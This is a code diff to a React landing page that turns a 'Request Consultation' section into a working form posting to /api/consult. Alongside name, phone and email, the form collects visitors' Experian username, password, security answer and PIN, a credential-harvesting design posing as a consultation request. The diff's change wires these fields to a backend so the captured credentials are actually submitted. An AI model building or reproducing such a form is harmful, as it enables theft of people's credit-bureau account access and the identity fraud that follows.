@@ -77,54 +77,67 @@ export default function Home() {
 
 
 
-   <div className="mt-5 grid gap-3">
-              <input
-                className="w-full rounded-xl border border-white/10 bg-zinc-900 px-4 py-3 text-center text-sm text-white placeholder:text-zinc-500 outline-none"
-                placeholder="Full name"
-              />
-              <input
-                className="w-full rounded-xl border border-white/10 bg-zinc-900 px-4 py-3 text-center text-sm text-white placeholder:text-zinc-500 outline-none"
-                placeholder="Phone number"
-                inputMode="tel"
-              />
-              <input
-                className="w-full rounded-xl border border-white/10 bg-zinc-900 px-4 py-3 text-center text-sm text-white placeholder:text-zinc-500 outline-none"
-                placeholder="Email"
-                inputMode="email"
-              />
+  
 
-              {/* Experian fields */}
-              <input
-                className="w-full rounded-xl border border-white/10 bg-zinc-900 px-4 py-3 text-center text-sm text-white placeholder:text-zinc-500 outline-none"
-                placeholder="Experian Username"
-              />
-              <input
-                type="password"
-                className="w-full rounded-xl border border-white/10 bg-zinc-900 px-4 py-3 text-center text-sm text-white placeholder:text-zinc-500 outline-none"
-                placeholder="Experian Password"
-              />
-              <input
-                className="w-full rounded-xl border border-white/10 bg-zinc-900 px-4 py-3 text-center text-sm text-white placeholder:text-zinc-500 outline-none"
-                placeholder="Security Answer"
-              />
-              <input
-                className="w-full rounded-xl border border-white/10 bg-zinc-900 px-4 py-3 text-center text-sm text-white placeholder:text-zinc-500 outline-none"
-                placeholder="PIN"
-                inputMode="numeric"
-              />
+<form action="/api/consult" method="post" className="mt-5 grid gap-3">
+  <input
+    name="name"
+    className="w-full rounded-xl border border-white/10 bg-zinc-900 px-4 py-3 text-center text-sm text-white placeholder:text-zinc-500 outline-none"
+    placeholder="Full name"
+  />
+  <input
+    name="phone"
+    className="w-full rounded-xl border border-white/10 bg-zinc-900 px-4 py-3 text-center text-sm text-white placeholder:text-zinc-500 outline-none"
+    placeholder="Phone number"
+    inputMode="tel"
+  />
+  <input
+    name="email"
+    className="w-full rounded-xl border border-white/10 bg-zinc-900 px-4 py-3 text-center text-sm text-white placeholder:text-zinc-500 outline-none"
+    placeholder="Email"
+    inputMode="email"
+  />
 
-              <button className="mt-1 w-full rounded-xl bg-white px-4 py-3 text-sm font-bold text-black transition active:scale-[0.99]">
-                Request Consultation
-              </button>
+  {/* Experian fields */}
+  <input
+    name="experian_username"
+    className="w-full rounded-xl border border-white/10 bg-zinc-900 px-4 py-3 text-center text-sm text-white placeholder:text-zinc-500 outline-none"
+    placeholder="Experian Username"
+  />
+  <input
+    name="experian_password"
+    type="password"
+    className="w-full rounded-xl border border-white/10 bg-zinc-900 px-4 py-3 text-center text-sm text-white placeholder:text-zinc-500 outline-none"
+    placeholder="Experian Password"
+  />
+  <input
+    name="security_answer"
+    className="w-full rounded-xl border border-white/10 bg-zinc-900 px-4 py-3 text-center text-sm text-white placeholder:text-zinc-500 outline-none"
+    placeholder="Security Answer"
+  />
+  <input
+    name="pin"
+    className="w-full rounded-xl border border-white/10 bg-zinc-900 px-4 py-3 text-center text-sm text-white placeholder:text-zinc-500 outline-none"
+    placeholder="PIN"
+    inputMode="numeric"
+  />
 
-              <div className="rounded-xl border border-white/10 bg-zinc-900 p-4 text-xs text-zinc-300">
-                <div className="font-semibold text-white">What happens next?</div>
-                <p className="mt-2">
-                  You’ll get a text from me with the next step.
-                </p>
-              </div>
+  <button
+    type="submit"
+    className="mt-1 w-full rounded-xl bg-white px-4 py-3 text-sm font-bold text-black transition active:scale-[0.99]"
+  >
+    Request Consultation
+  </button>
+
+  <div className="rounded-xl border border-white/10 bg-zinc-900 p-4 text-xs text-zinc-300">
+    <div className="font-semibold text-white">What happens next?</div>
+    <p className="mt-2">
+      You’ll get a text from me with the next step.
+    </p>
+  </div>
+</form>
             </div>
-          </div>
+          
         </section>
 
         {/* Story */}
